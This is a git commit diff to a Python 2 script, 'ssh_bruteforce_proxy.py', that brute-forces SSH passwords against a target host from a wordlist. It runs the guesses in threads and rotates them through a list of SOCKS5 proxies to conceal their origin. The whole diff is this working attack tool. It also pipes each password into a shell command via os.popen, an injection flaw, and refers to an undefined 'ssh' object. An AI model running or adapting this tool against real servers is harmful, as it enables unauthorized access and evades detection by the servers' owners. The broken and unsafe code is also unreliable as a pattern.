b57e06cc11faf8bce8345aada182a988ffeda85f
d3n50 <55601803+d3n50@users.noreply.github.com>
2020-04-23 19:33:45 +0100

    Update ssh_bruteforce_proxy.py

--- ssh_bruteforce_proxy.py
+++ ssh_bruteforce_proxy.py
@@ -18,32 +18,35 @@ import time
 def request(proxy, p_proxy, password):
 
 ########################## Use the proxy
-        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, p_proxy) ### Change proxy time
-        socket.socket = socks.socksocket
+	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, p_proxy)
+	socket.socket = socks.socksocket
 ###########################
 
-        warnings.filterwarnings(action='ignore',module='.*paramiko.*')
+	warnings.filterwarnings(action='ignore',module='.*paramiko.*')
 
-        hostname = sys.argv[1]
-        port = sys.argv[2]
-        username = sys.argv[3]
+	hostname = sys.argv[1]
+	port = sys.argv[2]
+	username = sys.argv[3]
 
-        try:
-            client = paramiko.SSHClient()
-            client.load_system_host_keys()
-            client.set_missing_host_key_policy(paramiko.WarningPolicy)
-            client.connect(hostname, port=port, username=username, password=password, timeout=10)
-            print "Success"
-        except Exception as e:
-           if 'Authentication failed.' in e:
-                print "Failed"
-           else:
-                print "ERROR"
-                no_done.write(password + "\n")
+	try:
+	    client = paramiko.SSHClient()
+	    client.load_system_host_keys()
+	    client.set_missing_host_key_policy(paramiko.WarningPolicy)
+	    client.connect(hostname, port=port, username=username, password=password, timeout=10)
+	    stdin, stdout, stderr = ssh.exec_command('ls -la')
+	    print ">>>>>>>>>>>>>>>>  Success: " + password
+	    ssh.close()
+	    exit()
+	except Exception as e:
+	   if 'Authentication failed.' in e:
+		print "failed login"
+		pass
+	   else:
+		script = "echo " + password+ " >> no_done.txt"
+		os.popen(script)
+		print "WRONG"
 
-
-no_done = open("no_done.txt", "w+")
-
+no_done = open("no_done.txt","w+")
 pass_file = open(sys.argv[4])
 lines_pass = pass_file.readlines()
 
@@ -56,10 +59,11 @@ proxy_file = open(sys.argv[5])
 lines_proxy = proxy_file.readlines()
 proxy_pos = 0
 
+
 for pos in range(0,int(leng_pass)):
 
     if proxy_pos >= int(leng_proxy):
-        proxy_pos = 0
+	proxy_pos = 0
     proxy = (lines_proxy[proxy_pos]).rstrip()
     ip_proxy = proxy.split()[0]
     port_proxy = int(proxy.split()[1])
@@ -67,9 +71,8 @@ for pos in range(0,int(leng_pass)):
     password = (lines_pass[pos]).rstrip()
 
     try:
-        t1 = threading.Thread(target=request,args=(ip_proxy, port_proxy, password))
-        t1.start()
-        time.sleep(0.3)
+	t1 = threading.Thread(target=request,args=(ip_proxy, port_proxy, password))
+	t1.start()
+	time.sleep(0.3)
     except:
-        no_done.write("no_done.txt")
-
+	no_done.write("no_done.txt")
